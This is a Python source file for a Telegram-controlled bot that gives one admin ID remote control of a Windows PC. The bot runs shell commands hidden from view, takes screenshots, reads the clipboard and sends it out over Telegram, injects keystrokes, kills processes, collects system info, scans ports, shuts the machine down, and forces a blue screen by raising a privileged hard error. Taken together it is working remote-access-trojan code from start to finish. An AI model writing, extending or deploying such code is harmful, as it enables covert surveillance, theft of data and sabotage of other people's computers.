import telebot
import ctypes
from ctypes import wintypes
import os

TOKEN = "your token"
ADMIN_ID = 123456789


bot = telebot.TeleBot(TOKEN)

print(True)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        user = message.from_user
        bot.send_message(ADMIN_ID, f"КТО-ТО ПОПЫТАЛСЯ ПОЛУЧИТЬ ДОСТУП К БОТУ\n@{user.username}\nID: {user.id}")
        return
    help_command(message)

@bot.message_handler(commands=['help'])
def help_command(message):
    if message.from_user.id != ADMIN_ID:
        return

    text = """
/help - all commands\n

/scr - скриншот всего экрана\n
/cmd - запуск команд из консоли\n
/write - ввод любого текста при помощи клавиатуры\n
/key - нажатие клавиш\n
/ct_notify - диалоговое окно ctypes\n
/pl_notify - уведомление plyer\n
/sinfo - информация о железе\n
/pinfo - информация о всех активных окнах\n
/clipb - получение текста из буфера обмена\n
/web - открытие ссылок\n
/moff - отключение монитора\n
/mon - включение монитора\n
/mlock - заблокировать монитор (Win+L)\n
/wkill - убить активное окно\n
/shutdown - shutdown or reboot pc\n
/pscan - scanning all ports\n
/bsod - blue screen of death\n

    """
    bot.reply_to(message, text)

@bot.message_handler(commands=['cmd'])
def run_command(message):
    import subprocess
    if message.from_user.id != ADMIN_ID:
        return

    cmd = message.text.replace("/run ", "").strip()
    if not cmd:
        bot.reply_to(message, "command?")
        return

    subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    bot.reply_to(message, f"Команда выполнена: {cmd}")


@bot.message_handler(commands=['scr'])
def screenshot_command(message):
    import pyautogui
    if message.from_user.id != ADMIN_ID:
        return

    screenshot = pyautogui.screenshot()
    path = "screen.png"
    screenshot.save(path)
    with open(path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove(path)

@bot.message_handler(commands=['write'])
def write_command(message):
    if message.from_user.id != ADMIN_ID:
        return

    from pynput.keyboard import Controller
    keyboard = Controller()

    text = message.text.replace("/write ", "").strip()
    if not text:
        bot.reply_to(message, "write any text")
        return

    keyboard.type(text)
    bot.reply_to(message, f"writed: {text}")

@bot.message_handler(commands=['key'])
def key_command(message):
    if message.from_user.id != ADMIN_ID:
        return

    from pynput.keyboard import Controller, Key
    keyboard = Controller()

    special_keys = {
        "enter": Key.enter,
        "space": Key.space,
        "tab": Key.tab,
        "shift": Key.shift,
        "ctrl": Key.ctrl,
        "alt": Key.alt,
        "backspace": Key.backspace,
        "esc": Key.esc,
        "up": Key.up,
        "down": Key.down,
        "left": Key.left,
        "right": Key.right,
        "f1": Key.f1,
        "f2": Key.f2,
        "f3": Key.f3,
        "f4": Key.f4,
        "f5": Key.f5,
        "f6": Key.f6,
        "f7": Key.f7,
        "f8": Key.f8,
        "f9": Key.f9,
        "f10": Key.f10,
        "f11": Key.f11,
        "f12": Key.f12,
    }

    key_text = message.text.replace("/key ", "").strip()
    if not key_text:
        bot.reply_to(message, f"{special_keys}")
        return

    try:
        if "+" in key_text:
            combo = key_text.split("+")
            keys = [special_keys.get(k.lower(), k) for k in combo]
            for k in keys:
                keyboard.press(k)
            for k in reversed(keys):
                keyboard.release(k)
        else:
            key = special_keys.get(key_text.lower(), key_text)
            keyboard.press(key)
            keyboard.release(key)

        bot.reply_to(message, f"key pressed: {key_text}")

    except Exception as e:
        bot.reply_to(message, f"error: {e}")
        print(e)



@bot.message_handler(commands=['ct_notify'])
def notify_command(message):
    import threading as th
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "/ct_notify [text]")
        return
    text = parts[1]
    th.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, " ", 0x10), daemon=True).start()
    bot.reply_to(message, f"Message was shown\ntext: {text}")

@bot.message_handler(commands=['pl_notify'])
def pl_notif(message):
    if message.from_user.id != ADMIN_ID:
        return

    from plyer import notification
    import threading as th

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "preview /pl_notify [заголовок] [текст]")
        return

    title = parts[1].lower()
    text = parts[2]

    th.Thread(target=lambda: notification.notify(title=title, message=text, app_name="System", timeout=10), daemon=True).start()
    bot.reply_to(message, f"уведомление показано:\nЗаголовок: {title}\nТекст: {text}")


@bot.message_handler(commands=["moff"])
def moff_system(message):
    import time
    if message.from_user.id != ADMIN_ID:
        return
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)

@bot.message_handler(commands=['mon'])
def mon_system(message):
    import time
    if message.from_user.id != ADMIN_ID:
        return
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    ctypes.windll.user32.mouse_event(0x0001, 1, 1, 0, 0)
    time.sleep(0.1)
    ctypes.windll.user32.mouse_event(0x0001, -1, -1, 0, 0)

@bot.message_handler(commands=['mlock'])
def mlock_system(message):
    if message.from_user.id != ADMIN_ID:
        return
    ctypes.windll.user32.LockWorkStation()

@bot.message_handler(commands=["wkill"])
def active_window_kill(message):
    if message.from_user.id != ADMIN_ID:
        return

    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()

    length = user32.GetWindowTextLengthW(hwnd)
    if length > 0:
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        title = buff.value
    else:
        title = "Заголовок отсутствует"

    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    pid_value = pid.value

    info_text = f"Window: {title}\nHWND:{hwnd}\nPID: {pid_value}\n\nЗакрыть? (y/n)"
    sent_msg = bot.send_message(message.chat.id, info_text)

    bot.register_next_step_handler(sent_msg, process_answer, hwnd, pid_value, title)


def process_answer(message, hwnd, pid_value, title):
    user32 = ctypes.windll.user32
    answer = message.text.lower().strip()
    if answer in ("y", "u", "н", "г"):
        if user32.IsWindow(hwnd):
            os.system(f"taskkill /PID {pid_value} /F /T >nul 2>&1")
            bot.send_message(message.chat.id, f"{title}\nPID: {pid_value}\nwas closed")
        else:
            bot.send_message(message.chat.id, "window not found")

    elif answer in ("n", "m", "ь", "б"):
        bot.send_message(message.chat.id, "cancelled")
    else:
        bot.send_message(message.chat.id, "??? restart /wkill")

@bot.message_handler(commands=['sinfo'])
def sinfo(message):
    if message.from_user.id != ADMIN_ID:
        return

    import psutil
    import platform

    bot.reply_to(message, f"{platform.system()}\n{platform.node()}\n{platform.platform()}\n{platform.machine()}\n"
                          f"{platform.python_build()}\n{platform.python_compiler()}\n{platform.processor()}\n"
                          f"{platform.python_version()}\n{psutil.cpu_count()}\n{psutil.virtual_memory()}")

@bot.message_handler(commands=['pinfo'])
def list_all_windows(message):
    if message.from_user.id != ADMIN_ID:
        return
    user32 = ctypes.windll.user32
    WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    windows_list = []

    # noinspection PyUnusedLocal
    def enum_windows_proc(hwnd, lparam):
        if user32.IsWindowVisible(hwnd):
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                windows_list.append(f"ID `{hwnd}`\nTitle: {buff.value}")
        return True

    user32.EnumWindows(WNDENUMPROC(enum_windows_proc), 0)

    if windows_list:
        full_message = "*Windows list:*\n\n" + "\n\n".join(windows_list)
        bot.send_message(message.chat.id, full_message, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "windows not found")

@bot.message_handler(commands=['clipb'])
def get_clipboard(message):
    if message.from_user.id != ADMIN_ID:
        return

    from ctypes import wintypes
    CF_UNICODETEXT = 13

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    user32.OpenClipboard.argtypes = [wintypes.HWND]

    user32.GetClipboardData.restype = wintypes.HANDLE
    user32.GetClipboardData.argtypes = [wintypes.UINT]

    kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalLock.restype = wintypes.LPVOID

    kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]

    def get_clipboard_text():
        text = None

        if user32.OpenClipboard(None):
            try:
                h_data = user32.GetClipboardData(CF_UNICODETEXT)
                if h_data:
                    ptr = kernel32.GlobalLock(h_data)
                    if ptr:
                        text = ctypes.c_wchar_p(ptr).value
                        kernel32.GlobalUnlock(h_data)
            finally:
                user32.CloseClipboard()

        return text

    data = get_clipboard_text()
    if data:
        bot.send_message(ADMIN_ID, f"clipboard: {data}")

@bot.message_handler(commands=['web'])
def webbrowser_start(message):
    if message.from_user.id != ADMIN_ID:
        return

    import webbrowser
    url = message.text.replace("/web ", "").strip()
    webbrowser.open(url)
    bot.reply_to(message, "url was opened")


@bot.message_handler(commands=['pscan'])
def scan_port(message):
    if message.from_user.id != ADMIN_ID:
        return
    import port_scan
    port_scan.run()


@bot.message_handler(commands=['shutdown'])
def shutdown_sys(message):
    if message.from_user.id != ADMIN_ID:
        return

    import subprocess
    parts = message.text.split(maxsplit=1)
    arg = parts[1]
    if len(parts) < 2:
        bot.send_message(ADMIN_ID, "arguments\ns - shutdown\nr - reboot")
        return

    if arg == "s":
        try:
            subprocess.run(["shutdown", "/S", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"error\n{e}")
        bot.send_message(ADMIN_ID, "pc was shutdowned")
        return

    if arg == "r":
        try:
            subprocess.run(["shutdown", "/R", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"error\n{e}")
        bot.send_message(ADMIN_ID, "pc was rebooted")
        return

@bot.message_handler(commands=['bsod'])
def bsod_ctypes(message):
    if message.from_user.id != ADMIN_ID:
        return

    ntdll = ctypes.windll.ntdll
    enabled = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))

    response = ctypes.c_uint()
    ntdll.NtRaiseHardError(
        0xC0000022,
        0,  # Number of parameters
        0,  # Unicode string parameter mask
        0,  # Address of parameters
        6,  # Option (6 = Shutdown/HardError)
        ctypes.byref(response)
    )

bot.polling(none_stop=True)
